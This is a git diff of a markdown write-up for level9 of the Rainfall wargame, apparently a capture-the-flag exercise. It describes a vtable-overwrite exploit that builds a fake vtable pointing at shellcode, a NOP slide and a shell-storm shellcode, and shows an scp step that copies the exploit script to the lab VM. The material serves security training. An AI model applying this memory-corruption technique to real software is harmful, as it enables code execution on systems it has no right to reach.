@@ -61,7 +61,9 @@ Shellcode from [shell-storm.org](https://shell-storm.org/shellcode/files/shellco
 t's now time to craft our exploit, we'll write our own vtable only consisting of the address of our shellcode that's coming up next, followed by a nop slide and then our shell code, right before the address of our fake vtable overwrighting the next one's.
 
 It will look like this:
+```markdown
 our fake vtable (start of shellcode `0x804A05C` * 8) -> 32bytes | padding (NOP `0x90`*48) -> 48bytes | shellcode -> 28 bytes | = 108 bytes, replacing 2nd obj vtable with ours at `0x804a00C`
+```
 
 
 Let's put it together in python
@@ -77,7 +79,7 @@ print vtable + padding + shellcode + destination
 
 ```shell
 # On host machine:
-scp -P 4242 Resources/exploit.py level9@$RAIN:/tmp/exploit.py
+scp -P 4242 Resources/exploit.py level9@rainfall:/tmp/exploit.py
 
 # On the Rainfall VM:
 chmod +x /tmp/exploit.py
